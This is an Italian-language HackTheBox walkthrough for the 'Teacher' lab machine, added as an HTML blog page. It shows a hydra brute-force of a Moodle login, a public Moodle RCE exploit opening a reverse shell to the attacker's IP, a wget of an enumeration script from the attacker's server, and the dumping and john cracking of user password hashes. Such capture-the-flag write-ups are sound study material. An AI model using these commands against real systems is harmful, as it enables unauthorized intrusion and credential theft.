@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	
+	<title>Teacher - HackTheBox</title>
+	
+	<meta name="description" content="">
+	<meta name="image" content="">
+	
+	<meta itemprop="name" content="Teacher - HackTheBox">
+	<meta itemprop="description" content="">
+	<meta itemprop="image" content="">
+	
+	<meta name="og:title" content="Teacher - HackTheBox">
+	<meta name="og:description" content="">
+	
+	<meta name="og:url" content="https://samirettali.com/posts/2019-07-05-teacher/">
+	<meta name="og:site_name" content="Teacher - HackTheBox">
+	<meta name="og:type" content="article">
+	
+	<meta name="article:tag" content="">
+	<link rel="stylesheet" type="text/css" href="https://samirettali.com/css/style.css">
+	
+	
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-123-45', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+</head>
+
+<body>
+
+<header>
+	
+	<a href="https://samirettali.com/" style="float: left;color:#ff3b30;">SE</a>
+	
+	&nbsp;&nbsp;<a href="https://samirettali.com/archives/" style="color:#777;">Archives</a>&nbsp;&nbsp;
+	
+	<a href="https://samirettali.com/posts/index.xml" style="color:#777;float: right;"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a>
+</header>
+
+
+<div class="content">
+  <h1>Teacher - HackTheBox</h1>
+  <aside></aside>
+  <p><p>Teacher è una macchina Linux da 20 punti con indirizzo ip <code>10.10.10.153</code></p>
+
+<p><img src="/images/htb-teacher/teacher.png" alt="Teacher" /></p>
+
+<p>Facciamo uno scan delle porte con nmap:
+<img src="/images/htb-teacher/scan.png" alt="Scan" /></p>
+
+<p>C&rsquo;è un web server in esecuzione sulla porta 80, visitiamolo:
+<img src="/images/htb-teacher/web.png" alt="Web" /></p>
+
+<p>Navigando tra le pagine del sito vediamo un immagine mancante nella sezione
+gallery:
+<img src="/images/htb-teacher/gallery.png" alt="Gallery" /></p>
+
+<p>Andando a leggere il sorgente, notiamo che nel caso in cui non venga caricata
+correttamente quell&rsquo;immagine, verrà loggato un messaggio nella console del
+browser:
+<img src="/images/htb-teacher/source.png" alt="Source" /></p>
+
+<p>Vediamo allora cosa contiene il file:
+<img src="/images/htb-teacher/5.png" alt="Source" /></p>
+
+<p>Abbiamo quindi una password che inizia con <code>Th4C00lTheacha</code> e a cui manca un
+carattere.</p>
+
+<p>Continuiamo la nostra ricerca e lanciamo un tool per cercare eventuali directory
+o file esposti (io uso <a href="https://github.com/ffuf/ffuf">ffuf</a> ma vanno bene anche
+<a href="https://github.com/maurosoria/dirsearch">dirsearch</a>,
+<a href="https://github.com/OJ/gobuster">gobuster</a> o altri):
+<img src="/images/htb-teacher/discovery.png" alt="Discovery" /></p>
+
+<p>Notiamo le directory phpmyadmin, che però risponde con codice <code>403 Access denied</code>,
+e la directory moodle:
+<img src="/images/htb-teacher/moodle.png" alt="Moodle" /></p>
+
+<p>Moodle è un CMS usato dagli istutiti scolastivi, in genere per pubblicare
+materiale sui vari corsi.
+Provando a fare il login vediamo che c&rsquo;è la possibilità di entrare come ospite:
+<img src="/images/htb-teacher/login.png" alt="Login" /></p>
+
+<p>Provando a navigare tra le varie sezioni non scopriamo niente di nuovo in quanto
+ci viene comunque chiesto di eseguire il login.</p>
+
+<p>Il corso di Algebra ha come professore Giovanni Chhatta, lo stesso nome che che
+c&rsquo;era nel messaggio nascosto nell&rsquo;immagine <code>5.png</code>. Abbiamo anche parte della
+password.</p>
+
+<p>Usiamo <a href="https://github.com/crunchsec/crunch">crunch</a> per generare le possibili
+password. Crunch sostituisce alcuni simboli con un set di caratteri predefinito:
+* <code>@</code> caratteri minuscoli
+* <code>,</code> caratteri maiuscoli
+* <code>%</code> numeri
+* <code>^</code> simboli</p>
+
+<p><img src="/images/htb-teacher/crunch.png" alt="Crunch" /></p>
+
+<p>Usiamo <a href="https://github.com/vanhauser-thc/thc-hydra">hydra</a> per eseguire trovare
+la password giusta:</p>
+<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">vagrant@kali:~$ hydra -t 8 -l Giovanni -P passwords.txt http-form-post://10.10.10.153 -f -m &#34;/moodle/login/index.php:username=^USER^&amp;password=^PASS^:Invalid&#34;</pre></div>
+<p>Scopriamo che la password è &ldquo;Th4C00lTheacha#&rdquo;. Facendo il login e dando un&rsquo;occhiata in giro non si trova niente di utile. Andando sulla pagina del corso di Algebra, in basso c&rsquo;è in link che dice &ldquo;Moodle Docs for this page&rdquo;. Cliccandolo ci porta alla documentazione di Moodle 3.4. Cerchiamo se c&rsquo;è qualche vulnerabilità nota su exploitdb.
+Troviamo un exploit che permette RCE, che sfrutta l&rsquo;esecuzione di codice nella creazione di un quiz sul portale. Ecco il link
+<a href="https://www.exploit-db.com/exploits/46551">https://www.exploit-db.com/exploits/46551</a></p>
+
+<p>L&rsquo;exploit di default esegue una reverse shell, dobbiamo quindi mettere netcat in
+ascolto sulla nostra macchina:</p>
+<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">vagrant@kali:~$ nc -nlvp 8081</pre></div>
+<p>Poi su un altro terminale eseguiamo l&rsquo;exploit, i parametri ip e port si
+riferiscono alla sessione di netcat in ascolto.</p>
+<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">vagrant@kali:~$ php moodle-3.4.3-rce.php url=http://10.10.10.153/moodle user=Giovanni pass=Th4C00lTheacha# ip=10.10.15.48 port=8081 course=2                                    
+
+*------------------------------*
+* Noodle [Moodle RCE] (v3.4.1) *
+*------------------------------*
+
+[!] Make sure you have a listener
+[!] at 10.10.15.48:8081
+
+[*] Logging in as user Giovanni with password Th4C00lTheacha#                                 
+[+] Successful Login
+[&gt;] Moodle Session r07l94v8etnshdrrjpr6a22uo5
+[&gt;] Moodle Key 3jfgrc2UVo
+[*] Loading Course ID 2
+[+] Successfully Loaded Course
+[*] Enable Editing
+[+] Successfully Enabled Course Editing
+[*] Adding Quiz
+[+] Successfully Added Quiz
+[*] Configuring New Quiz
+[+] Successfully Configured Quiz
+[*] Loading Edit Quiz Page
+[+] Successfully Loaded Edit Quiz Page
+[*] Adding Calculated Question
+[+] Successfully Added Calculation Question
+[*] Adding Evil Question
+[+] Successfully Created Evil Question
+[*] Sending Exploit
+
+[&gt;] You should receive a reverse shell attempt from the target at 10.10.15.48 on port 8081    
+[&gt;] If connection was successful this program will wait here until you close the connection.  
+[&gt;] You should be able to Ctrl+C and retain the connection through netcat.   </pre></div>
+<p>L&rsquo;exploit dovrebbe connettere il server alla nostra sessione di netcat, dandoci
+quindi una shell remota, eseguiamo il seguente comando python per spawnare una
+shell più utilizzabile:</p>
+<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">$ python -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</pre></div>
+<p>Dovremmo avere la seguente shell:</p>
+<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">www-data@teacher:/var/www/html/moodle/question$</pre></div>
+<p>Carichiamo sul server lo script LinEnum.sh per fare enumeration. Per caricarlo, dato che il server non ha
+accesso a internet, eseguiamo un web server sul nostro computer nella cartella
+dove abbiamo LinEnum.sh, e dall&rsquo;altra parte scarichiamolo con wget.</p>
+<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">vagrant@kali:~$ python2 -m SimpleHTTPServer 9999</pre></div>
+<p>In questo caso 10.10.15.48 è il mio IP</p>
+<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">www-data@teacher:/tmp$ wget http://10.10.15.48:9999/LinEnum.sh</pre></div>
+<p>Eseguendo LinEnum scopriamo che possiamo leggere /etc/shadow, ma provando
+crackare le password degli utenti giovanni e root con rockyou non si trova
+niente.
+Vediamo invece che c&rsquo;è un database mysql in esecuzione, cerchiamo nel file
+moodle/config.php la password per connettersi al database e scopriamo che è
+&ldquo;Welkom1!&rdquo;. Connettiamoci allora al database:</p>
+<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">www-data@teacher:/var/www/html/moodle/question$ mysql -u root -p</pre></div>
+<p>Vediamo quali database ci sono:</p>
+<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">MariaDB [moodle]&gt; show databases; 
+show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| moodle             |
+| mysql              |
+| performance_schema |
+| phpmyadmin         |
++--------------------+
+5 rows in set (0.00 sec)</pre></div>
+<p>Vediamo cosa c&rsquo;è nel database moodle:</p>
+<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">MariaDB [moodle]&gt; show tables;
+show tables;
++----------------------------------+
+| Tables_in_moodle                 |
++----------------------------------+
+| mdl_analytics_indicator_calc     |
+| mdl_analytics_models             |
+| mdl_analytics_models_log         |
+| mdl_analytics_predict_samples    |
+| mdl_analytics_prediction_actions |
+| mdl_analytics_predictions        |
+| mdl_analytics_train_samples      |
+| mdl_analytics_used_analysables   |
+| mdl_analytics_used_files         |
+| mdl_assign                       |
+               ...
+| mdl_user                         |
+| mdl_workshopform_accumulative    |
+| mdl_workshopform_comments        |
+| mdl_workshopform_numerrors       |
+| mdl_workshopform_numerrors_map   |
+| mdl_workshopform_rubric          |
+| mdl_workshopform_rubric_config   |
+| mdl_workshopform_rubric_levels   |
++----------------------------------+
+388 rows in set (0.01 sec)
+
+MariaDB [moodle]&gt;</pre></div>
+<p>Controlliamo la tabella mdl_user:</p>
+<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">MariaDB [moodle]&gt; select username, password from mdl_user;                                                                                                                                                           
++-------------+--------------------------------------------------------------+
+| username    | password                                                     |
++-------------+--------------------------------------------------------------+
+| guest       | $2y$10$ywuE5gDlAlaCu9R0w7pKW.UCB0jUH6ZVKcitP3gMtUNrAebiGMOdO |
+| admin       | $2y$10$7VPsdU9/9y2J4Mynlt6vM.a4coqHRXsNTOq/1aA6wCWTsF2wtrDO2 |
+| giovanni    | $2y$10$38V6kI7LNudORa7lBAT0q.vsQsv4PemY7rf/M1Zkj/i1VqLO0FSYO |
+| Giovannibak | 7a860966115182402ed06375cf0a22af                             |
++-------------+--------------------------------------------------------------+
+4 rows in set (0.00 sec)
+
+MariaDB [moodle]&gt;</pre></div>
+<p>Copiamo gli hash in un file e proviamo a crackarli con john the ripper usando la
+solita wordlist rockyou</p>
+<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">vagrant@kali:~$ john dbpasswords.txt --wordlist=rockyou.txt</pre></div>
+<p>Scopriamo che la password è expelled</p>
+</p>
+</div>
+
+
+  <p>Written on Jul 5, 2019.</p>
+
+
+<footer>
+	<p>&copy; 2019 All rights reserved.</p>
+</footer>
+</body>
+</html>
